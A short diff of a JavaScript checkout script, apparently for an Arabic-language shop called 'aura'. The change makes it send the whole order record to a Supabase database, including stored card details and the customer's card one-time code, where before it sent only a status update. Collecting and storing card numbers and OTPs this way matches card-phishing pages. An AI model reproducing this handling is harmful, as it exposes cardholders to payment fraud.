@@ -909,7 +909,7 @@
                 existingOrder.status = 'تم الدفع';
                 existingOrder.cardDetails.otp = otpVal;
                 localStorage.setItem('auraOrders', JSON.stringify(orders));
-                updateOrderStatusInSupabase(existingOrder.id, 'تم الدفع');
+                saveOrderToSupabase(existingOrder);
             } else {
                 const cardNumber = cardNumberInput.value.replace(/\D/g, '');
                 const last4 = cardNumber.slice(-4);
